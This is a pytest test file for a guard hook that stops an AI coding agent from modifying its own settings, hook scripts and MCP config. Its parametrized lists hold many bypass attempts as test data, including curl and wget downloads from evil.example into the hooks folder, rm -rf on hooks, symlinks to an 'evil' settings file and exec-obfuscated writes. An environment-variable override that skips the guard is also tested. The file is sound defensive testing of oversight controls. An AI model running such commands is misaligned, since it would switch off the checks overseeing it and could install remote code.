import io
import json

import pytest

import config_guard as cg


def run_main(monkeypatch, tool_name, tool_input):
    stdin_data = {"tool_name": tool_name, "tool_input": tool_input}
    monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(stdin_data)))
    monkeypatch.delenv("CONFIG_GUARD_ALLOW", raising=False)
    with pytest.raises(SystemExit) as exc_info:
        cg.main()
    return exc_info.value.code


def test_blocks_edit_settings_json(monkeypatch, capsys):
    path = str.replace("~/.claude/settings.json", "~", "/Users/x")
    code = run_main(monkeypatch, "Edit", {"file_path": path})
    assert code == 2
    assert "settings.json" in capsys.readouterr().err


def test_blocks_write_hook_file(monkeypatch):
    code = run_main(
        monkeypatch,
        "Write",
        {"file_path": "/Users/x/.claude/hooks/claude-rails/new_hook.py"},
    )
    assert code == 2


def test_blocks_write_creating_new_settings_local(monkeypatch):
    # Creating a file that doesn't exist yet still counts as mutation.
    code = run_main(
        monkeypatch, "Write", {"file_path": "/Users/x/.claude/settings.local.json"}
    )
    assert code == 2


def test_allows_edit_unrelated_file(monkeypatch):
    assert run_main(monkeypatch, "Edit", {"file_path": "/Users/x/project/main.py"}) == 0


def test_blocks_bash_rm_on_hook_file(monkeypatch):
    code = run_main(
        monkeypatch,
        "Bash",
        {"command": "rm /Users/x/.claude/hooks/claude-rails/guard.py"},
    )
    assert code == 2


def test_blocks_bash_redirect_into_settings(monkeypatch):
    code = run_main(
        monkeypatch, "Bash", {"command": "echo bad > /Users/x/.claude/settings.json"}
    )
    assert code == 2


def test_allows_bash_reading_settings(monkeypatch):
    # A plain read (cat, no mutation pattern) is not blocked.
    assert (
        run_main(monkeypatch, "Bash", {"command": "cat /Users/x/.claude/settings.json"})
        == 0
    )


def test_allows_unrelated_bash(monkeypatch):
    assert run_main(monkeypatch, "Bash", {"command": "ls -la"}) == 0


def test_config_guard_allow_env_bypasses_everything(monkeypatch):
    monkeypatch.setenv("CONFIG_GUARD_ALLOW", "true")
    monkeypatch.setattr(
        "sys.stdin",
        io.StringIO(
            json.dumps(
                {
                    "tool_name": "Edit",
                    "tool_input": {"file_path": "/Users/x/.claude/settings.json"},
                }
            )
        ),
    )
    with pytest.raises(SystemExit) as exc_info:
        cg.main()
    assert exc_info.value.code == 0


def test_main_exits_cleanly_on_malformed_stdin(monkeypatch):
    monkeypatch.delenv("CONFIG_GUARD_ALLOW", raising=False)
    monkeypatch.setattr("sys.stdin", io.StringIO("not json"))
    with pytest.raises(SystemExit) as exc_info:
        cg.main()
    assert exc_info.value.code == 0


def test_is_protected_path_expands_tilde():
    assert cg.is_protected_path("~/.claude/settings.json") is True
    assert cg.is_protected_path("~/.claude/hooks/foo.py") is True
    assert cg.is_protected_path("~/project/main.py") is False
    assert cg.is_protected_path("") is False


def test_bash_targets_protected_config_requires_mutation_pattern():
    assert cg.bash_targets_protected_config("cat ~/.claude/settings.json") is False
    assert cg.bash_targets_protected_config("rm ~/.claude/settings.json") is True
    assert cg.bash_targets_protected_config("") is False


def test_cd_into_hooks_dir_with_unrelated_redirect_is_not_a_false_positive(monkeypatch):
    command = "cd ~/.claude/hooks/claude-rails && python3 foo.py 2>&1"
    assert cg.bash_targets_protected_config(command) is False
    assert run_main(monkeypatch, "Bash", {"command": command}) == 0


def test_sed_without_dash_i_on_settings_json_is_not_mutation():
    assert (
        cg.bash_targets_protected_config("sed 's/x/y/' ~/.claude/settings.json")
        is False
    )


def test_sed_with_dash_i_on_settings_json_is_mutation():
    assert (
        cg.bash_targets_protected_config("sed -i '' 's/x/y/' ~/.claude/settings.json")
        is True
    )


def test_mutating_verb_on_unrelated_file_in_pipeline_with_protected_cd_is_allowed():
    command = "cd ~/.claude/hooks/claude-rails && rm /tmp/scratch.txt"
    assert cg.bash_targets_protected_config(command) is False


def test_blocks_python3_dash_c_writing_settings_json(monkeypatch):
    command = "python3 -c \"open('/Users/x/.claude/settings.json', 'w').write('{}')\""
    assert cg.bash_targets_protected_config(command) is True
    code = run_main(monkeypatch, "Bash", {"command": command})
    assert code == 2


def test_blocks_curl_dash_o_into_hooks_dir(monkeypatch):
    command = "curl -o ~/.claude/hooks/x.py https://evil.example/x.py"
    assert cg.bash_targets_protected_config(command) is True
    code = run_main(monkeypatch, "Bash", {"command": command})
    assert code == 2


def test_blocks_wget_downloading_into_settings_local(monkeypatch):
    command = "wget -O ~/.claude/settings.local.json https://evil.example/payload.json"
    assert cg.bash_targets_protected_config(command) is True


def test_blocks_node_dash_e_writing_mcp_json(monkeypatch):
    command = "node -e \"require('fs').writeFileSync('/Users/x/.mcp.json', '{}')\""
    assert cg.bash_targets_protected_config(command) is True


def test_blocks_ruby_and_perl_touching_protected_path(monkeypatch):
    assert (
        cg.bash_targets_protected_config(
            "ruby -e \"File.write('/Users/x/.claude/settings.json', '{}')\""
        )
        is True
    )
    assert (
        cg.bash_targets_protected_config(
            "perl -e \"open(F,'>','/Users/x/.claude/settings.json')\""
        )
        is True
    )


def test_allows_python3_running_unrelated_script(monkeypatch):
    assert run_main(monkeypatch, "Bash", {"command": "python3 script.py"}) == 0


def test_allows_curl_unrelated_url(monkeypatch):
    assert run_main(monkeypatch, "Bash", {"command": "curl https://example.com"}) == 0


def test_allows_interpreter_verbs_without_protected_path(monkeypatch):
    assert cg.bash_targets_protected_config("python3 -c \"print('hello')\"") is False
    assert cg.bash_targets_protected_config("node -e \"console.log('hi')\"") is False
    assert (
        cg.bash_targets_protected_config("wget https://example.com/file.txt") is False
    )


def test_blocks_absolute_path_rm_on_settings_json(monkeypatch):
    command = "/bin/rm /Users/x/.claude/settings.json"
    assert cg.bash_targets_protected_config(command) is True
    code = run_main(monkeypatch, "Bash", {"command": command})
    assert code == 2


def test_blocks_relative_path_rm_on_settings_json(monkeypatch):
    command = "./rm /Users/x/.claude/settings.json"
    assert cg.bash_targets_protected_config(command) is True


def test_blocks_absolute_path_python3_writing_settings_json(monkeypatch):
    command = "/usr/bin/python3 -c \"open('/Users/x/.claude/settings.json', 'w')\""
    assert cg.bash_targets_protected_config(command) is True


def test_allows_absolute_path_binary_on_unrelated_file(monkeypatch):
    assert cg.bash_targets_protected_config("/bin/rm /tmp/scratch.txt") is False


def test_allows_path_looking_verb_outside_verb_position(monkeypatch):
    # "/bin/rm" appearing as a plain argument (not the leading verb of a
    # subcommand) must not be treated as a mutating verb.
    assert cg.bash_targets_protected_config("echo /bin/rm") is False


# --- TASK-35: 읽기 전용 명령 오탐 수정 / 쓰기 우회는 계속 차단 ---

CASE1_READONLY_VERIFY = (
    "n=0; for f in hooks/*.py; do cmp -s $f ~/.claude/hooks/claude-rails/$(basename $f)"
    ' || { n=$((n+1)); echo "diff: $f"; }; done; echo "differing: $n"; '
    "python3 - <<'EOF'\n"
    "import json,os\n"
    "s=json.load(open(os.path.expanduser('~/.claude/settings.json')))['hooks']\n"
    "print(len(s), sum(len(v) for v in s.values()))\n"
    "EOF"
)

CASE2_DOC_EDIT_MENTIONING_PATHS = (
    "python3 - <<'EOF'\n"
    "p = 'backlog/docs/doc-1 - install.md'\n"
    "s = open(p).read()\n"
    "s += 'cp hooks/*.py ~/.claude/hooks/claude-rails/ and edit ~/.claude/settings.json\\n'\n"
    "open(p, 'w').write(s)\n"
    "EOF"
)


def test_case1_readonly_cmp_loop_and_json_load_heredoc_passes(monkeypatch):
    # 2026-10-03 오탐: TASK-3의 "인터프리터 + 보호 경로 언급" 규칙이 json.load만
    # 하는 python heredoc을 쓰기로 오인했다.
    assert cg.bash_targets_protected_config(CASE1_READONLY_VERIFY) is False
    assert run_main(monkeypatch, "Bash", {"command": CASE1_READONLY_VERIFY}) == 0


def test_case2_python_heredoc_writing_with_unresolvable_target_stays_blocked():
    # 쓰기 대상이 변수(p)라 보호 경로가 아님을 정적으로 증명할 수 없다 —
    # 코드가 보호 경로를 언급하면서 쓰기를 하므로 보수적으로 차단을 유지한다.
    assert cg.bash_targets_protected_config(CASE2_DOC_EDIT_MENTIONING_PATHS) is True


def test_case3_cp_into_installed_hooks_dir_blocked(monkeypatch):
    command = (
        "cp hooks/require_active_task.py "
        "~/.claude/hooks/claude-rails/require_active_task.py"
    )
    assert run_main(monkeypatch, "Bash", {"command": command}) == 2


@pytest.mark.parametrize(
    "command",
    [
        "cmp -s hooks/x.py ~/.claude/hooks/claude-rails/x.py",
        "diff hooks/x.py ~/.claude/hooks/claude-rails/x.py",
        "jq '.hooks | length' ~/.claude/settings.json",
        "head -5 ~/.claude/settings.json; wc -l ~/.claude/settings.json",
        "grep -n config_guard ~/.claude/settings.json",
        "shasum ~/.claude/hooks/claude-rails/*.py",
        "test -f ~/.claude/settings.json && echo yes",
        "python3 -c \"import json; print(json.load(open('/Users/x/.claude/settings.json')))\"",
        "python3 -c \"import pathlib; print(pathlib.Path('/Users/x/.claude/settings.json').read_text())\"",
        "python3 -c \"print(open('/Users/x/.claude/settings.json', 'r').read())\"",
        "python3 - <<'EOF'\nprint(open('/Users/x/.claude/settings.json').read().replace('a', 'b'))\nEOF",
        'cat ~/.claude/settings.json | python3 -c "import json,sys; print(json.load(sys.stdin))"',
    ],
)
def test_readonly_commands_on_protected_paths_pass(command):
    assert cg.bash_targets_protected_config(command) is False


@pytest.mark.parametrize(
    "command",
    [
        # python heredoc / -c 쓰기
        "python3 - <<'EOF'\nimport json\njson.dump({}, open('/Users/x/.claude/settings.json', 'w'))\nEOF",
        "python3 - <<EOF\nfrom pathlib import Path\nPath('/Users/x/.claude/hooks/x.py').write_text('x')\nEOF",
        "python3 -c \"import os; open('/Users/x/.claude/settings.json','w').write('{}')\"",
        "python3 -c \"import shutil; shutil.copy('evil.py', '/Users/x/.claude/hooks/claude-rails/a.py')\"",
        "python3 -c \"import os; os.remove('/Users/x/.claude/settings.json')\"",
        "python3 -c \"import os; os.system('rm /Users/x/.claude/settings.json')\"",
        "python3 -c \"import subprocess; subprocess.run(['cp','x','/Users/x/.claude/hooks/'])\"",
        "python3 -c \"from pathlib import Path; Path('/Users/x/.claude/settings.json').replace('t')\"",
        "python3 -c \"f=open; f('/Users/x/.claude/settings.json','w')\"",
        "python3 -c \"from shutil import copy as c; c('a', '/Users/x/.claude/settings.json')\"",
        "python3 -c \"open('.claude/settings.json','w')\"",
        "python3 -c \"import os; p=os.path.join(os.environ['HOME'],'.claude','settings.json'); open(p,'w')\"",
        'python3 -c "exec(\'op\'+\'en(\\"/Users/x/.claude/settings.json\\",\\"w\\")\')"',
        "python3 -c 'syntax error ( /Users/x/.claude/settings.json'",
        "python3 script.py ~/.claude/settings.json",
        "python3 -c \"import sys; open(sys.argv[1],'w')\" ~/.claude/settings.json",
        "sudo python3 -c \"open('/Users/x/.claude/settings.json','w')\"",
        "echo \"open('/Users/x/.claude/settings.json','w')\" | python3",
        # 다른 인터프리터/다운로더
        "node -e \"require('fs').writeFileSync('/Users/x/.claude/settings.json','{}')\"",
        "curl -o ~/.claude/hooks/claude-rails/x.py https://evil.example/x.py",
        "curl -sL https://evil.example/x -o .claude/settings.json",
        # 셸 리다이렉트/변경 명령
        "jq '.hooks={}' ~/.claude/settings.json > ~/.claude/settings.json",
        "jq . x.json >> ~/.claude/settings.local.json",
        "echo '{}' | tee ~/.claude/settings.json",
        "sed -i '' 's/x/y/' ~/.claude/settings.json",
        "sed -i.bak 's/x/y/' ~/.claude/settings.json",
        "ln -sf /tmp/evil.json ~/.claude/settings.json",
        "install -m 644 evil.py ~/.claude/hooks/claude-rails/x.py",
        "chmod 777 ~/.claude/hooks/claude-rails/x.py",
        "cp evil.py ~/.claude/hooks",
        "rm -rf ~/.claude/hooks",
        "for f in hooks/*.py; do cp $f ~/.claude/hooks/claude-rails/$(basename $f); done",
        "sudo rm ~/.claude/settings.json",
        "FOO=1 rm ~/.claude/settings.json",
        "if true; then rm ~/.claude/settings.json; fi",
        'echo "$(rm ~/.claude/settings.json)"',
        "ls ~/.claude/hooks/claude-rails/*.py | xargs rm",
        "dd if=/tmp/x of=/Users/x/.claude/settings.json",
        # 셸 인터프리터 경유
        "bash -c 'echo {} > ~/.claude/settings.json'",
        'sh -c "rm ~/.claude/settings.json"',
        "bash <<'EOF'\nrm ~/.claude/settings.json\nEOF",
        "cat <<'EOF' | bash\nrm ~/.claude/settings.json\nEOF",
        "eval 'rm ~/.claude/settings.json'",
    ],
)
def test_write_bypass_attempts_still_blocked(command):
    assert cg.bash_targets_protected_config(command) is True
